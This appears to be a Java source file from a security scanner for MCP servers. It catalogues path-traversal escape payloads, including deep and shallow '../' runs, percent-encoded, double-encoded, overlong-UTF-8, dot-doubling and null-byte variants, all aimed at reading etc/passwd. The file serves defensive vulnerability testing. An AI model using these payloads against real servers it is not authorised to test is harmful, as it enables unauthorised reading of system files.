package com.mcpscanner.checks;

import java.util.List;

/**
 * Shared dot-dot escape catalogue for the two path-traversal payload families
 * ({@link ResourceTraversalPayloads} over {@code resources/read} URIs and
 * {@link ToolArgTraversalPayloads} over {@code tools/call} argument values). Both families escape a
 * filesystem root the same way — they differ only in whether the escape is suffixed to a discovered
 * base prefix (resources) or stands alone (tool args) — so the prefix depth, the encoded twins, and
 * the target-encoding rules live here once.
 *
 * <p><b>Clamp principle + a shallow companion.</b> {@code path.join} / {@code realpath} / the OS open
 * path all CLAMP an excess {@code ../} run at the filesystem root: walking up past {@code /} is a
 * no-op. So a sufficiently-deep escape subsumes every shallower root that NORMALISES before checking —
 * a server rooted three directories deep and one rooted sixteen deep are both reached by the same deep
 * prefix, which resolves to the real filesystem root and the canonical target ({@code etc/passwd}).
 * The deep prefix is therefore the primary escape. We ALSO keep ONE shallow {@code ../}×3 literal
 * companion as belt-and-braces: a handler with a RAW depth/length prefilter (reject before
 * normalising) could admit a short {@code ../}×3 yet reject the long {@code ../}×16 outright — the
 * shallow twin reaches that handler where the deep one is filtered. Both literal levels share the same
 * {@code differentialKey}, so oracle/dedup accounting is unchanged (one finding, not two). This is a
 * small principled set {3, 16}, NOT an open-ended sweep. A correctly-sandboxed server still rejects
 * both, and the corroborated {@link FileSignature} content oracle keeps the extra reach FP-safe.
 */
final class TraversalEscapes {

    /**
     * Number of {@code ../} levels in the canonical deep escape. Chosen to over-walk any realistic
     * install root (a deeply nested {@code node_modules}/site-packages tree is well under this) so a
     * single prefix reaches the filesystem root via the clamp principle; excess levels are harmless.
     */
    static final int DEEP_LEVELS = 16;

    /**
     * Number of {@code ../} levels in the shallow companion escape — short enough to pass a RAW
     * depth/length prefilter that would reject the deep prefix before normalising it.
     */
    static final int SHALLOW_LEVELS = 3;

    /** The canonical literal-slash deep escape prefix: {@code ../} repeated {@link #DEEP_LEVELS} times. */
    static final String DEEP_PREFIX = "../".repeat(DEEP_LEVELS);

    /** The shallow literal-slash companion prefix: {@code ../} repeated {@link #SHALLOW_LEVELS} times. */
    static final String SHALLOW_PREFIX = "../".repeat(SHALLOW_LEVELS);

    /** The small principled set of literal {@code ../} prefixes {deep, shallow} emitted per traversal
     *  family, all sharing one {@code differentialKey} so oracle/dedup accounting is unchanged. */
    static final List<String> LITERAL_PREFIXES = List.of(DEEP_PREFIX, SHALLOW_PREFIX);

    enum TargetEncoding { NONE, SLASH_PCT, SLASH_NULL }

    record EncodedTwin(String label, String escape, TargetEncoding targetEncoding) {}

    /**
     * The encoded escape twins, each repeated to {@link #DEEP_LEVELS} so an encoded escape reaches a
     * deep-rooted decode-after-check server (not just a shallow root) — the same clamp principle as
     * the literal prefix.
     */
    static final List<EncodedTwin> ENCODED_TWINS = List.of(
            new EncodedTwin("pct-slash", repeat("..%2f"), TargetEncoding.SLASH_PCT),
            new EncodedTwin("pct-backslash", repeat("..%5c"), TargetEncoding.SLASH_PCT),
            new EncodedTwin("double-pct-slash", repeat("..%252f"), TargetEncoding.SLASH_PCT),
            new EncodedTwin("pct-dot", repeat("%2e%2e%2f"), TargetEncoding.SLASH_PCT),
            new EncodedTwin("overlong-utf8", repeat("%c0%ae%c0%ae%c0%af"), TargetEncoding.SLASH_PCT),
            new EncodedTwin("dot-doubling", repeat("....//"), TargetEncoding.NONE),
            new EncodedTwin("null-byte", DEEP_PREFIX, TargetEncoding.SLASH_NULL));

    private TraversalEscapes() {}

    static String encodeTarget(String target, TargetEncoding encoding) {
        return switch (encoding) {
            case NONE -> target;
            case SLASH_PCT -> target.replace("/", "%2f");
            case SLASH_NULL -> target + "%00.txt";
        };
    }

    private static String repeat(String escape) {
        return escape.repeat(DEEP_LEVELS);
    }
}
